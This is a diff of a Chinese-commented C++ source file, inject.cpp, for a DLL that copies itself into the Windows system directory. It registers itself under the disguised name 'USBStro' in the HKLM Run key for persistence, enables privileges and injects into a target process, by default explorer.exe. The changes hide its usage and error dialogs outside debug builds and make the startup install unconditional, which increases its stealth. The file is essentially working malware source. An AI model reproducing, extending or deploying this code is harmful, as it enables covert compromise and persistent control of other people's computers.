@@ -3,16 +3,7 @@
  * All rights reserved.
  *
  * 文件名称：inject.cpp
- * 文件标识：见配置管理计划书
  * 摘    要：DLL主程序,执行安装与插入进程
- *
- * 当前版本：1.0
- * 作    者：outmatch
- * 完成日期：2006年9月6日
- *
- * 取代版本：无
- * 原作者  ：
- * 完成日期：
  */
 
 #include "stdafx.h"
@@ -27,7 +18,7 @@ using namespace std;
 // Macro to make our code less messy.
 #define KERNEL32_PROC(x)	g_kernel32.##x## = (fn##x##)::GetProcAddress(::GetModuleHandleA("Kernel32"), #x ##)
 
-// RemoteLib使用
+// RemoteLib所使用
 extern HINSTANCE g_hModInstance;
 
 extern "C" __declspec(dllexport) void CALLBACK Install (
@@ -44,30 +35,26 @@ extern "C" __declspec(dllexport) void CALLBACK Start (
 		int nCmdShow
 		);
 
-// Dllname
+/// dll的文件名
 char g_szDllname[MAX_PATH+1] = { 0 };
-// 缺省路径
+/// 缺省下载路径
 const char* g_szDefaultPath = "C:\\windows\\system32\\usbstro.dll.dump";
 
-// 写入到注册表启动项
+/// 写入到注册表启动项
 void installToSystem()
 {
 	string dstPath;
 	HKEY phkResult;
 
+	// 写入"rundll32 dllname,Start target.exe"到启动项
 	const char* KeyName = "USBStro";
 	char KeyValue[MAX_PATH+1];
 	strcpy(KeyValue, "rundll32 ");
 	strcat(KeyValue, g_szDllname);
-	strcat(KeyValue, ",Install ");
+	strcat(KeyValue, ",Start ");
+	if(__argc >= 3)
+		strcat(KeyValue, __argv[2]);
 
-	if(__argc < 4)
-		dstPath = g_szDefaultPath;
-	else
-		dstPath = __argv[3];
-	strcat(KeyValue, __argv[2]);
-	strcat(KeyValue, " ");
-	strcat(KeyValue, dstPath.c_str());
 	RegCreateKeyEx(HKEY_LOCAL_MACHINE,
 			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\",
 			0,
@@ -86,7 +73,7 @@ void installToSystem()
 	RegCloseKey(phkResult);
 }
 
-// 自安装DLL
+/// 安装DLL到系统内部，使用rundll32运行
 extern "C" __declspec(dllexport) void CALLBACK Install (
 		HWND hwnd,
 		HINSTANCE hInstance,
@@ -95,9 +82,11 @@ extern "C" __declspec(dllexport) void CALLBACK Install (
 		)
 {
 	if(__argc < 2) {
+#ifdef _DEBUG
 		char str[MAX_PATH+1] = { "\0" };
-		_snprintf(str, MAX_PATH, "用法: rundll32.exe %s,Install <插入进程名>", g_szDllname);
+		_snprintf(str, MAX_PATH, "用法: rundll32.exe %s,Install <插入进程名> [存储位置]", g_szDllname);
 		MessageBox(0, str, g_szDllname, 0);
+#endif
 		return;
 	}
 
@@ -116,16 +105,13 @@ extern "C" __declspec(dllexport) void CALLBACK Install (
 	CopyFile(dllPath, destPath.c_str(), FALSE);
 
 	std::string dstPath;
-	// 在调试环境下不安装到系统启动项
-#ifndef _DEBUG
 	if(__argc < 4) 
 		dstPath = g_szDefaultPath;
 	else
 		dstPath = __argv[3];
 	installToSystem();
-#else
-	dstPath = g_szDefaultPath;
-#endif
+
+	// 记录目标目录名到配置文件
 	string str = getConfigPath();
 	ofstream of(str.c_str());
 	of << dstPath << endl;
@@ -134,6 +120,7 @@ extern "C" __declspec(dllexport) void CALLBACK Install (
 	Start(hwnd, hInstance, lpCmdLine, nCmdShow);
 }
 
+/// 启动程序，使用"rundll32 xxx.dll,Start [target.exe]"启动
 extern "C" __declspec(dllexport) void CALLBACK Start (
 		HWND hwnd,
 		HINSTANCE hInstance,
@@ -141,6 +128,14 @@ extern "C" __declspec(dllexport) void CALLBACK Start (
 		int nCmdShow
 		)
 {
+	const char* pszTarget;
+	if(__argc < 3) {
+		pszTarget = "explorer.exe"; // 缺省目标为explorer.exe
+	}
+	else {
+		pszTarget = __argv[2];
+	}
+
 	string destPath;
 	destPath = getSystemPath();
 	destPath += "\\";
@@ -148,12 +143,14 @@ extern "C" __declspec(dllexport) void CALLBACK Start (
 	
 	enablePrivilege();	
 	// 选择被注射的线程
-	PIDGroup pid = GetDestProcessID(__argv[2]);
+	PIDGroup pid = GetDestProcessID(pszTarget);
 	if(pid.empty())
 	{
+#ifdef _DEBUG
 		CHAR msg[BUFSIZ + 1];
-		_snprintf(msg, BUFSIZ, "%s : 目标进程未找到", __argv[2]);
+		_snprintf(msg, BUFSIZ, "%s : 目标进程未找到", pszTarget);
 		MessageBox(0, msg, g_szDllname, 0);
+#endif
 		return;
 	}
 	for(size_t i=0; i<pid.size(); i++) {
@@ -224,4 +221,3 @@ BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved )
 
 	return TRUE;
 }
-
